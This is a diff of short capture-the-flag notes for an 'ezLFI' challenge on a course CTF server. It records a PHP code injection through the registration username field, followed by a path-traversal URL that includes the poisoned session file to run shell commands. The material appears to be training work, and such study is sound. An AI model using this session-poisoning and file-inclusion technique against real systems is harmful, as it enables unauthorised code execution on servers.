@@ -2,6 +2,9 @@
 
 ## ezLFI
 1. https://edu-ctf.csie.org:10157/?action=register
-user=<?php system("ls -al");
-2. sessid = kje7fdu65vfrfe1tnur1cpqte2
-3. finally https://edu-ctf.csie.org:10157/?action=module&m=../../../var/lib/php/session/sess_kje7fdu65vfrfe1tnur1cpqte2
+post data: user=<?php system("ls /"); ?>
+
+<?php eval('system(ls /);');
+
+2. sessid = tdq3l7c0j4nmn0ovje4dbq5k46
+3. finally https://edu-ctf.csie.org:10157/?action=module&m=../../../../var/lib/php/session/sess_tdq3l7c0j4nmn0ovje4dbq5k46
